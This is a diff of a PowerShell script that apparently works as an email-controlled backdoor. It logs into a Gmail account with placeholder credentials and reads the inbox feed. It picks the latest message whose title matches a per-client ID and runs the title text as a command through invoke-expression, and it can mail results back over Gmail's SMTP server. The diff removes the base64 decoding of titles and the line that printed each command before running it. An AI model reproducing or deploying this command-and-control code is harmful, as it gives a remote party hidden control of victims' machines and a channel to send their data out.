@@ -1,10 +1,9 @@
 cls
 $username = "emailaddress@gmail.com" 
 $password = "password goes here" 
-$client_name = "client ID number ext 123533"
+$client_name = "random number for each client ex: 123455"
 
 Function sendmail($message){
-
 $SMTPServer = "smtp.gmail.com"
 $SMTPPort = "587"
 $to = $username
@@ -41,6 +40,8 @@ $xml = [xml]$xml
 $inbox = $xml.feed.entry
 
 
+
+
 $object_01 = New-object psobject -property @{
 Title = $msg.title
 Time = $msg.issued
@@ -52,7 +53,6 @@ foreach ($msg in $inbox){
 $object_001 = $object_01|select-object *
 $issued = $msg.issued
 $title = $msg.title
-$title = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($title))
 
 $object_001.Time = $issued
 $object_001.Title = $title
@@ -60,15 +60,12 @@ $array += $object_001
 
 }
 
-
-
-
 $finder = $array|where-object {$_.Title -match $client_name}|sort-object -property Time |select-object -last 1
 
 if($check) {if ([datetime]$finder.Time -eq [datetime]$check){continue}}
 
 $command = $finder.title.split('~')[0]
-$command
+
 invoke-expression $command
 $check = $finder.Time
 
